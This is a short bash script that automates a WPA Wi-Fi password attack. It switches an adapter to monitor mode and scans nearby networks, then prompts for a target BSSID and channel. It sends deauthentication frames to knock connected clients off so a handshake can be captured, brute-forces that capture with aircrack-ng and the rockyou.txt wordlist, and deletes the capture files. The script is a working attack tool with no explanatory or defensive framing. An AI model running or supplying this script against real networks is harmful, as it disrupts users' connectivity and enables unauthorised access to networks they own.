#!/bin/bash
sudo rm -rf wpacap-01*
read -p "Please enter your wireless adapter interface name (use iwconfig):" wlan
sudo rfkill list all
sudo ifconfig $wlan down
sudo iwconfig $wlan mode monitor
sudo ifconfig $wlan up
sudo timeout 12s airodump-ng $wlan
read -p "Please choose a WPA encrypted network bssid/mac from above:" NetMac
read -p "please specify channel of network:" c
sudo iwconfig $wlan channel $c
sudo aireplay-ng --deauth 25 -a $NetMac $wlan &
sudo sudo timeout 20s airodump-ng --bssid $NetMac --channel $c $wlan --write wpacap i &
wait
sudo aircrack-ng wpacap-01.cap -w rockyou.txt
sudo rm -rf wpacap-01*
